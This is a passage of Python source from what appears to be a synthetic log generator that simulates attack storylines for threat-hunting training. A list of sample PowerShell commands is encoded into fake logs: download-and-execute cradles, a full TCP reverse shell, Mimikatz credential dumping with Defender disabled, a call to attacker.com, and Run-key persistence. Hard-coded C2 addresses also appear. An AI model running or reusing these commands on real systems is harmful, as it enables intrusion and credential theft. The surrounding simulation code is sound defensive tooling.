                    event_type=event_type,
                    activity=storyline_event.activity,
                    details=storyline_event.details
                )

                if malicious_event:
                    self.malicious_events.append(malicious_event)

            # Barrier flush after each storyline event (ensures event written before proceeding)
            self._barrier_flush_all_emitters()

    def _execute_single_storyline_event(self, event_idx: int) -> None:
        """Execute a single storyline event by index (used for interleaved generation)."""
        storyline_event = self.scenario.storyline[event_idx]
        event_num = event_idx + 1

        # Parse event time with jitter
        event_time = self._parse_storyline_time(storyline_event.time)
        jitter_rng = random.Random(hash(f"jitter_{event_num}_{self.scenario.name}"))
        jitter = timedelta(
            seconds=jitter_rng.uniform(-30, 30),
            microseconds=jitter_rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(storyline_event.actor)
        system = self._find_system(storyline_event.system)
        if not actor or not system:
            return

        logger.info(f"Executing interleaved storyline event: {storyline_event.actor} on {storyline_event.system} at {event_time}")

        event_types = self._match_activity_to_events(storyline_event.activity)
        self.state_manager.set_current_time(event_time)

        for event_type in event_types:
            malicious_event = self._execute_storyline_event(
                actor=actor, system=system, time=event_time,
                event_type=event_type, activity=storyline_event.activity,
                details=storyline_event.details,
            )
            if malicious_event:
                self.malicious_events.append(malicious_event)

    def _parse_storyline_time(self, time_str: str) -> datetime:
        """Parse storyline event time to absolute datetime.

        Supports:
        - ISO 8601 absolute time: "2024-01-15T10:30:00Z"
        - Relative offset (duration): "+2h30m"
        - Relative offset (seconds): "+7200"

        Args:
            time_str: Time string to parse

        Returns:
            Absolute datetime (UTC)

        Raises:
            ValueError: If time format is invalid
        """
        # ISO 8601 absolute time (starts with year)
        if time_str[0].isdigit() and len(time_str) > 10:
            return parse_iso8601(time_str)

        # Relative offset
        if time_str.startswith('+'):
            offset_str = time_str[1:]

            # Try seconds first (all digits)
            if offset_str.isdigit():
                offset = timedelta(seconds=int(offset_str))
            else:
                # Parse duration string (e.g., "2h30m")
                offset = parse_duration(offset_str)

            return self.start_time + offset

        raise ValueError(f"Invalid storyline time format: {time_str}")

    def _match_activity_to_events(self, activity: str) -> list[str]:
        """Match activity description to event types using keyword matching.

        Phase 1: Simple keyword-based matching.

        Args:
            activity: Activity description string

        Returns:
            List of event types to generate
        """
        # Keyword mapping for Phase 1
        keywords = {
            'logon': ['logon', 'log in', 'login', 'authenticate', 'sign in', 'rdp', 'ssh'],
            'logoff': ['logoff', 'log off', 'logout', 'sign out'],
            'process': ['execute', 'run', 'launch', 'start', 'spawn', 'powershell', 'cmd', 'command', 'search', 'read', 'enumerate', 'dump', 'query', 'list', 'archive', 'compress', 'delete', 'remove', 'clean'],
            'connection': ['connect', 'access', 'download', 'upload', 'communicate', 'c2', 'exfiltrate', 'ssh', 'rdp', 'remote'],
        }

        activity_lower = activity.lower()
        matched = []

        for event_type, kws in keywords.items():
            if any(kw in activity_lower for kw in kws):
                matched.append(event_type)

        # Default to process if no match
        return matched if matched else ['process']

    def _execute_storyline_event(
        self,
        actor: User,
        system: System,
        time: datetime,
        event_type: str,
        activity: str,
        details: Optional[dict]
    ) -> Optional[dict]:
        """Execute a single storyline event of a specific type.

        Args:
            actor: User performing the activity
            system: System where activity occurs
            time: Event timestamp
            event_type: Type of event (logon, process, connection, etc.)
            activity: Activity description
            details: Optional activity-specific details

        Returns:
            Malicious event dict for GROUND_TRUTH.md, or None if not tracked
        """
        details = details or {}
        malicious_event = {
            'time': time,
            'actor': actor.username,
            'system': system.hostname,
            'activity': activity,
            'type': event_type,
        }

        if event_type == 'logon':
            # Default attacker IPs: realistic hosting/VPN ranges (not RFC 5737)
            _attacker_ips = ['45.33.32.156', '185.220.101.34', '91.219.236.174', '23.129.64.210', '116.202.120.181']
            source_ip = details.get('source_ip', random.choice(_attacker_ips))
            # Auto-detect logon type from technique/activity keywords
            is_rdp_logon = ('rdp' in activity.lower()
                            or details.get('technique', '').startswith('T1021.001')
                            or details.get('dst_port') == 3389)
            is_ssh_logon = ('ssh' in activity.lower()
                            or details.get('technique', '').startswith('T1021.004'))
            default_logon_type = 10 if is_rdp_logon else 3
            logon_type = details.get('logon_type', default_logon_type)
            logon_id = self.activity_generator.generate_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=logon_type,
                source_ip=source_ip
            )
            malicious_event['logon_id'] = logon_id
            malicious_event['source_ip'] = source_ip

        elif event_type == 'process':
            # Get or create session for this user
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            if not sessions:
                # Create session first with timestamp slightly before the process
                logon_time = time - timedelta(seconds=random.uniform(0.5, 2.0))
                logon_id = self.activity_generator.generate_logon(actor, system, logon_time, logon_type=3)
            else:
                logon_id = sessions[0].logon_id  # Use first active session

            # Linux command events: emit bash_history + eCAR for commands
            from evidenceforge.generation.activity import _get_os_category
            linux_command = details.get('command')
            os_category = _get_os_category(system.os)
            if linux_command and os_category == 'linux':
                # Emit bash history entry
                self.activity_generator.generate_bash_command(
                    actor, system, time, linux_command
                )
                # Also generate eCAR PROCESS/CREATE for the command
                cmd_binary = linux_command.split()[0] if linux_command.strip() else '/bin/bash'
                process_name = cmd_binary
                command_line = linux_command
            else:
                # Use details or create malicious-looking process (Windows)
                process_name = details.get('process_name', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe')
                command_line = details.get('command_line', 'powershell.exe -enc <base64_encoded_command>')

            # Replace base64 placeholder with actual encoded command
            if '<base64_encoded_command>' in command_line:
                command_line = command_line.replace(
                    '<base64_encoded_command>',
                    self._generate_encoded_powershell(hash(f"{time}_{actor.username}"))
                )

            # Use previous storyline process as parent (attack chain continuity)
            last_pid = getattr(self, '_last_storyline_pid', None)
            if last_pid and self.activity_generator._is_pid_alive(system, last_pid):
                parent_pid = last_pid
            else:
                parent_pid = self.activity_generator._select_parent_pid(system, actor, process_name)
            pid = self.activity_generator.generate_process(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
                process_name=process_name,
                command_line=command_line,
                parent_pid=parent_pid,
            )
            self.activity_generator._record_user_process(system, actor, pid, process_name)

            self._last_storyline_pid = pid  # Track for parent chain continuity
            malicious_event['process_name'] = process_name
            malicious_event['command_line'] = command_line
            malicious_event['pid'] = pid

            # Emit FILE/CREATE for output files referenced in command line
            output_file = self._extract_output_file(command_line, os_category)
            if output_file:
                file_time = time + timedelta(seconds=random.uniform(0.5, 3.0))
                from evidenceforge.events.base import RawLogEntry
                self.dispatcher.dispatch_raw(RawLogEntry(
                    timestamp=file_time, target_emitter='ecar',
                    data={
                        'timestamp': file_time,
                        'hostname': system.hostname,
                        'object': 'FILE', 'action': 'CREATE',
                        'file_name': output_file,
                        'pid': pid,
                        'principal': actor.username,
                    },
                ))
                malicious_event['output_file'] = output_file

            # Emit 4648 for processes using explicit credentials (PsExec, WMIC, runas, etc.)
            _EXPLICIT_CRED_TOOLS = {'psexec', 'wmic', 'runas', 'schtasks', 'net.exe', 'net1.exe'}
            proc_basename = process_name.rsplit('\\', 1)[-1].lower() if '\\' in process_name else process_name.lower()
            technique = details.get('technique', '')
            if (proc_basename in _EXPLICIT_CRED_TOOLS
                    or technique.startswith('T1021')
                    or technique.startswith('T1053')) and os_category == 'windows':
                target_server = details.get('dst_ip', 'localhost')
                cred_time = time - timedelta(milliseconds=random.randint(5, 50))
                self.activity_generator.generate_explicit_credentials(
                    user=actor,
                    system=system,
                    time=cred_time,
                    target_username=actor.username,
                    target_server=target_server,
                    process_name=process_name,
                    process_pid=pid,
                )

        elif event_type == 'connection':
            # Detect SSH from activity keywords or MITRE technique
            is_ssh = ('ssh' in activity.lower()
                      or details.get('technique', '').startswith('T1021.004')
                      or details.get('dst_port') == 22
                      or details.get('service') == 'ssh')

            # Detect RDP from activity keywords or MITRE technique
            is_rdp = ('rdp' in activity.lower()
                      or details.get('technique', '').startswith('T1021.001')
                      or details.get('dst_port') == 3389
                      or details.get('logon_type') == 10)

            # Default C2 IPs: realistic cloud hosting ranges (not RFC 5737)
            _c2_ips = ['159.65.43.201', '134.209.29.115', '167.71.156.88', '64.227.38.102', '108.61.13.174']
            if is_ssh:
                # SSH: target is the storyline system, source is from details or actor's workstation
                dst_ip = system.ip
                dst_port = 22
                service = 'ssh'
            elif is_rdp:
                # RDP: target is the storyline system, source from details
                dst_ip = system.ip
                dst_port = 3389
                service = 'rdp'
            else:
                dst_ip = details.get('dst_ip', random.choice(_c2_ips))
                dst_port = details.get('dst_port', 443)
                service = details.get('service', 'ssl')

            # For lateral movement (SSH/RDP), the source is the attacker's previous system
            source_ip = details.get('source_ip', system.ip)

            # Validate destination is different from source
            if dst_ip == system.ip and not is_ssh and not is_rdp:
                logger.warning(
                    f"Skipping storyline connection: dst_ip {dst_ip} matches system IP {system.ip}. "
                    f"Adjusting to external IP."
                )
                dst_ip = random.choice(['159.65.43.201', '134.209.29.115', '167.71.156.88'])

            # SSH connections use compound ssh_session event (Zeek + syslog + eCAR)
            if is_ssh:
                source_ip = details.get('source_ip', system.ip)
                target = next((s for s in self.scenario.environment.systems if s.ip == dst_ip), system)
                uid = self.activity_generator.generate_ssh_session(
                    user=actor, target_system=target, time=time, source_ip=source_ip,
                )
            elif is_rdp:
                # RDP: generate network connection from source to target system
                uid = self.activity_generator.generate_connection(
                    src_ip=source_ip, dst_ip=dst_ip, time=time,
                    dst_port=3389, service='rdp',
                    duration=random.uniform(60.0, 3600.0),
                    orig_bytes=random.randint(50000, 500000),
                    resp_bytes=random.randint(100000, 2000000),
                    emit_dns=False,  # RDP typically uses IP directly
                )
            elif dst_port == 22:
                target = next((s for s in self.scenario.environment.systems if s.ip == dst_ip), None)
                if target:
                    uid = self.activity_generator.generate_ssh_session(
                        user=actor, target_system=target, time=time, source_ip=source_ip,
                    )
                else:
                    uid = self.activity_generator.generate_connection(
                        src_ip=source_ip, dst_ip=dst_ip, time=time,
                        dst_port=22, service='ssh', duration=random.uniform(30.0, 1800.0),
                        orig_bytes=random.randint(2000, 50000), resp_bytes=random.randint(5000, 200000),
                        emit_dns=True,
                    )
            else:
                uid = self.activity_generator.generate_connection(
                    src_ip=source_ip, dst_ip=dst_ip, time=time,
                    dst_port=dst_port, service=service,
                    duration=random.uniform(1.0, 30.0),
                    orig_bytes=random.randint(1000, 10000),
                    resp_bytes=random.randint(5000, 50000),
                    emit_dns=True,
                )

            malicious_event['dst_ip'] = dst_ip
            malicious_event['dst_port'] = dst_port
            malicious_event['uid'] = uid if uid else '(filtered by sensor placement)'

            # Emit 4648 (explicit credentials) for lateral movement to internal systems
            from evidenceforge.generation.activity import _get_os_category as _os_cat
            technique = details.get('technique', '')
            is_lateral = (is_ssh or is_rdp
                          or technique.startswith('T1021')
                          or technique.startswith('T1053'))
            if is_lateral and _os_cat(system.os) == 'windows':
                target_host = next(
                    (s for s in self.scenario.environment.systems if s.ip == dst_ip),
                    None,
                )
                target_server_name = target_host.hostname if target_host else dst_ip
                cred_time = time - timedelta(milliseconds=random.randint(5, 50))
                self.activity_generator.generate_explicit_credentials(
                    user=actor,
                    system=system,
                    time=cred_time,
                    target_username=actor.username,
                    target_server=target_server_name,
                    process_name=r'C:\Windows\System32\lsass.exe',
                    process_pid=0,
                    source_ip=source_ip,
                )

        return malicious_event

    @staticmethod
    def _extract_output_file(command_line: str, os_category: str) -> str | None:
        """Extract output file path from a command line string.

        Detects common output file patterns in PowerShell, cmd, and Linux commands.
        Returns the file path if found, None otherwise.
        """
        import re
        patterns = [
            r'Export-Csv\s+[\'"]?([^\s\'">;]+)',       # PowerShell Export-Csv
            r'-OutFile\s+[\'"]?([^\s\'">;]+)',          # PowerShell -OutFile
            r'Out-File\s+[\'"]?([^\s\'">;]+)',          # PowerShell Out-File
            r'>\s*[\'"]?([^\s\'">;]+)',                 # Shell redirect >
            r'-o\s+[\'"]?([^\s\'">;]+)',                # Common -o flag
            r'--output[= ]\s*[\'"]?([^\s\'">;]+)',      # --output flag
        ]
        for pattern in patterns:
            match = re.search(pattern, command_line, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _find_user(self, username: str) -> Optional[User]:
        """Find user by username.

        Args:
            username: Username to search for

        Returns:
            User object or None if not found
        """
        for user in self.scenario.environment.users:
            if user.username == username:
                return user
        return None

    def _find_actor(self, actor_name: str) -> Optional[User]:
        """Find actor by name, checking users first then service/built-in accounts.

        For service and built-in accounts, returns a synthetic User object
        with the account name as the username.

        Args:
            actor_name: Actor name to resolve

        Returns:
            User object or None if not found
        """
        user = self._find_user(actor_name)
        if user:
            return user

        service_accounts = set(self.scenario.environment.service_accounts)
        if actor_name in BUILTIN_ACCOUNTS or actor_name in service_accounts:
            return User(
                username=actor_name,
                full_name=actor_name,
                email=f"{actor_name.lower().replace(' ', '.')}@system.local",
                enabled=True,
            )

        return None

    def _find_system(self, hostname: str) -> Optional[System]:
        """Find system by hostname.

        Args:
            hostname: Hostname to search for

        Returns:
            System object or None if not found
        """
        for system in self.scenario.environment.systems:
            if system.hostname == hostname:
                return system
        return None

    def _finalize(self) -> None:
        """Finalize generation and close all emitters.

        Flushes remaining buffered events and closes emitter files.
        Phase 2.1: Gracefully stops emitter threads before closing.
        """
        logger.info("Finalizing generation")

        # Close all emitters (stop threads + flush + write footer)
        for format_name, emitter in self.emitters.items():
            logger.info(f"Stopping {format_name} emitter thread")
            emitter.close()

        logger.info("All emitters closed")

    def _generate_ground_truth(self) -> None:
        """Generate GROUND_TRUTH.md documentation.

        Creates comprehensive attack documentation including narrative,
        timeline, and IOCs for threat hunting training.
        """
        self.ground_truth_dir.mkdir(parents=True, exist_ok=True)
        output_path = self.ground_truth_dir / "GROUND_TRUTH.md"

        generator = GroundTruthGenerator(
            scenario=self.scenario,
            malicious_events=self.malicious_events
        )

        generator.generate(output_path)
        logger.info(f"Ground truth documentation generated: {output_path}")

    def _build_sid_registry(self) -> dict[str, str]:
        """Build a SID registry mapping usernames to Windows SIDs.

        Generates a domain base SID (S-1-5-21-{3 sub-authorities}) and assigns
        each user a unique RID starting at 1001. Well-known SIDs are included
        for system accounts.

        Returns:
            Dict mapping username to full SID string
        """
        # Generate domain base SID with 3 random sub-authority values
        rng = random.Random(hash(self.scenario.name))  # Deterministic per scenario
        base_sid = (
            f"S-1-5-21-{rng.randint(1000000000, 3999999999)}"
            f"-{rng.randint(1000000000, 3999999999)}"
            f"-{rng.randint(1000000000, 3999999999)}"
        )

        registry: dict[str, str] = {
            # Well-known SIDs
            'SYSTEM': 'S-1-5-18',
            'LOCAL SERVICE': 'S-1-5-19',
            'NETWORK SERVICE': 'S-1-5-20',
            # Well-known domain RIDs
            'Administrator': f"{base_sid}-500",
            'Guest': f"{base_sid}-501",
            'krbtgt': f"{base_sid}-502",
        }

        # Assign per-user RIDs starting at 1001 with random gaps (realistic)
        rid = 1001
        for user in self.scenario.environment.users:
            registry[user.username] = f"{base_sid}-{rid}"
            rid += rng.randint(1, 5)  # Random gap simulates deleted accounts

        # Computer account SIDs (hostname$)
        comp_rid = max(rid + 10, 1100)  # Start computer RIDs after user RIDs
        for system in self.scenario.environment.systems:
            machine_name = f"{system.hostname}$"
            registry[machine_name] = f"{base_sid}-{comp_rid}"
            comp_rid += rng.randint(1, 3)

        # Service account SIDs
        svc_rid = max(comp_rid + 10, 2001)
        for svc in self.scenario.environment.service_accounts:
            if svc not in registry:
                registry[svc] = f"{base_sid}-{svc_rid}"
                svc_rid += rng.randint(1, 3)

        logger.info(f"Built SID registry: {len(registry)} entries (domain: {base_sid})")
        return registry

    def _get_next_event_record_id(self) -> int:
        """Get next EventRecordID for Windows events.

        Returns:
            Next sequential EventRecordID
        """
        self.event_record_counter += 1
        return self.event_record_counter

    # --- Phase 5.4: System Process Trees & Background Traffic ---

    # Service name → (port, zeek_service) mapping for database detection
    _DB_SERVICE_MAP = {
        'mssql': (1433, 'mssql'),
        'sql server': (1433, 'mssql'),
        'mysql': (3306, 'mysql'),
        'mariadb': (3306, 'mysql'),
        'postgres': (5432, 'postgresql'),
        'postgresql': (5432, 'postgresql'),
    }

    # Realistic decoded PowerShell commands for base64 encoding
    _POWERSHELL_COMMANDS = [
        "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
        "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
        "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
        "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
        "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
        "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
        "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
        "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
        "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
        "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
    ]

    def _generate_encoded_powershell(self, seed: int) -> str:
        """Generate a realistic base64-encoded PowerShell command.

        PowerShell -enc expects UTF-16LE encoded base64.
        """
        rng = random.Random(hash(f"ps_enc_{seed}_{self.scenario.name}"))
        cmd = rng.choice(self._POWERSHELL_COMMANDS)
        return base64.b64encode(cmd.encode('utf-16-le')).decode('ascii')

    def _resolve_ad_domain(self) -> str:
        """Resolve Active Directory domain FQDN from scenario.

        Priority: environment.domain > inferred from user emails > 'corp.local'
        """
        env = self.scenario.environment
        if env.domain:
            return env.domain
        # Infer from first user email with a domain
        for user in env.users:
            if user.email and '@' in user.email:
                email_domain = user.email.split('@', 1)[1]
                if '.' in email_domain:
                    return email_domain
        return 'corp.local'

    def _detect_infrastructure_ips(self) -> dict[str, str | list]:
        """Detect infrastructure IPs from scenario systems.

        Scans system hostnames/types/services for role hints and
        maps them to IPs. Falls back to defaults for missing roles.
        """
        infra: dict[str, str | list] = {
            'dns': [],              # List of DNS server IPs (DCs run DNS)
            'ntp': ['129.6.15.28', '132.163.97.1'],
            'dc': [],               # List of DC IPs
            'dc_hostnames': [],     # Matching DC hostnames
            'db_servers': [],
            'exchange': None,       # Internal Exchange/mail server IP
        }

        for system in self.scenario.environment.systems:
            hn = system.hostname.lower()
            stype = system.type.lower() if system.type else ''
            if 'dc' in hn or stype == 'domain_controller':
                infra['dc'].append(system.ip)
                infra['dc_hostnames'].append(system.hostname)
                if system.ip not in infra['dns']:
                    infra['dns'].append(system.ip)  # DCs usually run DNS
            elif 'dns' in hn:
                if system.ip not in infra['dns']:
                    infra['dns'].append(system.ip)
            elif 'ntp' in hn:
                infra['ntp'] = [system.ip]
            elif 'exch' in hn or 'mail' in hn or stype == 'mail_server':
                infra['exchange'] = system.ip

            # Detect database servers from services list
            for svc in system.services:
                svc_lower = svc.lower()
                for svc_key, (port, zeek_svc) in self._DB_SERVICE_MAP.items():
                    if svc_key in svc_lower:
                        infra['db_servers'].append({
                            'ip': system.ip,
                            'port': port,
                            'service': zeek_svc,
                        })
                        break  # One match per service entry is enough

        # Fallbacks when no DCs/DNS detected
        if not infra['dns']:
            infra['dns'] = ['10.0.0.1']
        if not infra['dc']:
            infra['dc'] = [infra['dns'][0]]
            infra['dc_hostnames'] = ['DC-01']

        return infra

    def _build_service_defaults(self) -> dict[str, list[str]]:
        """Build per-system service lists, auto-populating defaults if empty."""
        from evidenceforge.generation.activity import _get_os_category

        defaults: dict[str, list[str]] = {}
        for system in self.scenario.environment.systems:
            if system.services:
                defaults[system.hostname] = list(system.services)
            else:
                os_cat = _get_os_category(system.os)
                if os_cat == 'windows':
                    svcs = ['dns-client', 'ntp-client', 'smb-client', 'kerberos-client', 'ldap-client']
                    if system.type and system.type.lower() in ('server', 'domain_controller'):
                        svcs.append('smb-server')
                else:
                    svcs = ['dns-client', 'ntp-client', 'syslog']
                defaults[system.hostname] = svcs
        return defaults

    def _seed_system_process_trees(self) -> None:
        """Pre-seed StateManager with long-running system processes.

        These processes were started at boot (before the scenario window).
        We register them silently (no log events) so they exist as valid
        parents for child processes spawned during the scenario.
        """
        from evidenceforge.generation.activity import _get_os_category

        for system in self.scenario.environment.systems:
            os_cat = _get_os_category(system.os)
            pids: dict[str, int] = {}

            if os_cat == 'windows':
                self._seed_windows_process_tree(system, pids)
            else:
                self._seed_linux_process_tree(system, pids)

            self._system_pids[system.hostname] = pids

        total = sum(len(p) for p in self._system_pids.values())
        logger.info(f"Seeded {total} system processes across {len(self._system_pids)} systems")

        # Phase 6.0: Share system PIDs with activity generator for dynamic ParentProcessName
        self.activity_generator._system_pids = self._system_pids
        # Share all system IPs for network logon source_ip selection
        self.activity_generator._all_system_ips = [s.ip for s in self.scenario.environment.systems]
        # Share detected DB servers for scenario-aware database connections
        self.activity_generator._db_servers = self._infra_ips.get('db_servers', [])
        # Phase 6.2: Share DNS server IPs (DCs run DNS in AD)
        self.activity_generator._dns_server_ips = self._infra_ips.get('dns', ['10.0.0.1'])
        # Phase 6.2: Share Exchange server IP for internal SMTP routing
        self.activity_generator._exchange_ip = self._infra_ips.get('exchange')

    def _seed_windows_process_tree(self, system: System, pids: dict[str, int]) -> None:
        """Seed Windows system process tree in StateManager."""
        sm = self.state_manager
        hn = system.hostname

        def _c(parent, image, cmd, user):
            return sm.create_process(hn, parent, image, cmd, user, 'System')

        # Level 1: smss.exe (child of System PID 4)
        pids['smss'] = _c(4, r'C:\Windows\System32\smss.exe', 'smss.exe', 'SYSTEM')

        # Level 2: csrss.exe, wininit.exe (children of smss)
        pids['csrss_s0'] = _c(pids['smss'], r'C:\Windows\System32\csrss.exe', 'csrss.exe', 'SYSTEM')
        pids['wininit'] = _c(pids['smss'], r'C:\Windows\System32\wininit.exe', 'wininit.exe', 'SYSTEM')

        # Level 3: services.exe, lsass.exe (children of wininit)
        pids['services'] = _c(pids['wininit'], r'C:\Windows\System32\services.exe', 'services.exe', 'SYSTEM')
        pids['lsass'] = _c(pids['wininit'], r'C:\Windows\System32\lsass.exe', 'lsass.exe', 'SYSTEM')

        # Level 4: svchost instances (children of services.exe)
        svchost_groups = [
            ('svchost_dcom', 'svchost.exe -k DcomLaunch', 'SYSTEM'),
            ('svchost_local_system', 'svchost.exe -k LocalSystem', 'SYSTEM'),
            ('svchost_netsvcs', 'svchost.exe -k netsvcs', 'NETWORK SERVICE'),
            ('svchost_local_svc', 'svchost.exe -k LocalService', 'LOCAL SERVICE'),
            ('svchost_net_svc', 'svchost.exe -k NetworkService', 'NETWORK SERVICE'),
            ('svchost_local_nr', 'svchost.exe -k LocalServiceNetworkRestricted', 'LOCAL SERVICE'),
            ('svchost_local_nn', 'svchost.exe -k LocalServiceNoNetwork', 'LOCAL SERVICE'),
            ('svchost_wusvcs', 'svchost.exe -k wusvcs', 'SYSTEM'),
        ]
        for name, cmdline, user in svchost_groups:
            pids[name] = _c(pids['services'], r'C:\Windows\System32\svchost.exe', cmdline, user)

        # Other services.exe children
        pids['msmpeng'] = _c(pids['services'], r'C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe', 'MsMpEng.exe', 'SYSTEM')
        pids['search_indexer'] = _c(pids['services'], r'C:\Windows\System32\SearchIndexer.exe', 'SearchIndexer.exe', 'SYSTEM')
        pids['taskhostw'] = _c(pids['services'], r'C:\Windows\System32\taskhostw.exe', 'taskhostw.exe', 'SYSTEM')

        # Session 1 processes (Phase 6.0: add winlogon → userinit → explorer chain)
        pids['csrss_s1'] = _c(pids['smss'], r'C:\Windows\System32\csrss.exe', 'csrss.exe', 'SYSTEM')
        pids['winlogon'] = _c(pids['smss'], r'C:\Windows\System32\winlogon.exe', 'winlogon.exe', 'SYSTEM')
        pids['userinit'] = _c(pids['winlogon'], r'C:\Windows\System32\userinit.exe', 'userinit.exe', 'SYSTEM')
        pids['explorer'] = _c(pids['userinit'], r'C:\Windows\explorer.exe', 'explorer.exe', 'SYSTEM')
        pids['dwm'] = _c(pids['csrss_s0'], r'C:\Windows\System32\dwm.exe', 'dwm.exe', 'SYSTEM')
        pids['runtime_broker'] = _c(pids['svchost_local_system'], r'C:\Windows\System32\RuntimeBroker.exe', 'RuntimeBroker.exe', 'SYSTEM')

    def _seed_linux_process_tree(self, system: System, pids: dict[str, int]) -> None:
        """Seed Linux system process tree in StateManager."""
        sm = self.state_manager
        hn = system.hostname
        os_str = system.os.lower()

        # Determine distro-specific details
        is_rhel = any(d in os_str for d in ('centos', 'rhel', 'red hat', 'rocky', 'alma'))

        def _c(parent, image, cmd, user):
            return sm.create_process(hn, parent, image, cmd, user, 'System')

        # PID 1: systemd (parent_pid=0 is allowed like PID 4)
        pids['systemd'] = _c(0, '/usr/lib/systemd/systemd', '/usr/lib/systemd/systemd --system --deserialize 26', 'root')

        # Direct children of systemd
        journal_path = '/usr/lib/systemd/systemd-journald'
        pids['journald'] = _c(pids['systemd'], journal_path, journal_path, 'root')

        udev_path = '/usr/lib/systemd/systemd-udevd' if is_rhel else '/lib/systemd/systemd-udevd'
        pids['udevd'] = _c(pids['systemd'], udev_path, udev_path, 'root')

        pids['rsyslogd'] = _c(pids['systemd'], '/usr/sbin/rsyslogd', 'rsyslogd -n', 'syslog')
        pids['networkmanager'] = _c(pids['systemd'], '/usr/sbin/NetworkManager', '/usr/sbin/NetworkManager --no-daemon', 'root')
        pids['dbus'] = _c(pids['systemd'], '/usr/bin/dbus-daemon', '/usr/bin/dbus-daemon --system', 'messagebus')

        logind_path = '/usr/lib/systemd/systemd-logind'
        pids['logind'] = _c(pids['systemd'], logind_path, logind_path, 'root')

        pids['sshd'] = _c(pids['systemd'], '/usr/sbin/sshd', '/usr/sbin/sshd -D [listener]', 'root')

        cron_name = '/usr/sbin/crond' if is_rhel else '/usr/sbin/cron'
        cron_cmd = '/usr/sbin/crond -n' if is_rhel else '/usr/sbin/cron -f'
        pids['cron'] = _c(pids['systemd'], cron_name, cron_cmd, 'root')

        pids['agetty1'] = _c(pids['systemd'], '/sbin/agetty', '/sbin/agetty --noclear tty1 linux', 'root')
        pids['agetty2'] = _c(pids['systemd'], '/sbin/agetty', '/sbin/agetty --noclear tty2 linux', 'root')
        pids['snapd'] = _c(pids['systemd'], '/usr/lib/snapd/snapd', '/usr/lib/snapd/snapd', 'root')
        pids['timesyncd'] = _c(pids['systemd'], '/usr/lib/systemd/systemd-timesyncd', '/usr/lib/systemd/systemd-timesyncd', 'systemd-timesync')

        # User login shell (sshd forks per-session sshd, then bash)
        pids['bash'] = _c(pids['sshd'], '/bin/bash', '-bash', 'root')

    def _generate_system_traffic(self, current_hour: datetime) -> None:
        """Generate system-initiated background traffic for all systems.

        Called once per hour. Generates DNS lookups, NTP syncs, SMB browsing,
        and scheduled task activity independently of user activity.

        Uses periodic-with-jitter timing to produce realistic autocorrelation
        in system event intervals.
        """
        from evidenceforge.generation.activity import _get_os_category

        rng = random.Random(hash(f"{self.scenario.name}_sys_{current_hour}"))
        dns_ips = self._infra_ips.get('dns', ['10.0.0.1'])
        if isinstance(dns_ips, str):
            dns_ips = [dns_ips]
        ntp_ips = self._infra_ips.get('ntp', ['129.6.15.28'])
        if isinstance(ntp_ips, str):
            ntp_ips = [ntp_ips]

        for system in self.scenario.environment.systems:
            services = self._system_service_defaults.get(system.hostname, [])
            os_cat = _get_os_category(system.os)
            sys_pids = self._system_pids.get(system.hostname, {})

            # DNS lookups: 2-6 per hour, evenly spaced with jitter
            if 'dns-client' in services:
                num_dns = rng.randint(2, 6)
                base_interval = 3600 / (num_dns + 1)
                for i in range(num_dns):
                    offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                    offset = max(0, min(3599, offset))
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=rng.choice(dns_ips),
                        time=ts,
                        dst_port=53,
                        proto='udp',
                        service='dns',
                        duration=rng.uniform(0.001, 0.05),
                        orig_bytes=rng.randint(40, 120),
                        resp_bytes=rng.randint(80, 512),
                    )

            # NTP sync: 0-1 per hour, anchored to per-system offset
            if 'ntp-client' in services and rng.random() < 0.6:
                offset = (hash(system.hostname) % 3600) + rng.gauss(0, 30)
                offset = max(0, min(3599, offset))
                ts = current_hour + timedelta(seconds=offset)
                self.state_manager.set_current_time(ts)
                ntp_ip = rng.choice(ntp_ips)
                self.activity_generator.generate_connection(
                    src_ip=system.ip,
                    dst_ip=ntp_ip,
                    time=ts,
                    dst_port=123,
                    proto='udp',
                    service='ntp',
                    duration=rng.uniform(0.01, 0.1),
                    orig_bytes=48,
                    resp_bytes=48,
                )

            # SMB browsing: 1-3 per hour (Windows workstations only), evenly spaced
            dc_ips = self._infra_ips.get('dc', ['10.0.0.1'])
            if isinstance(dc_ips, str):
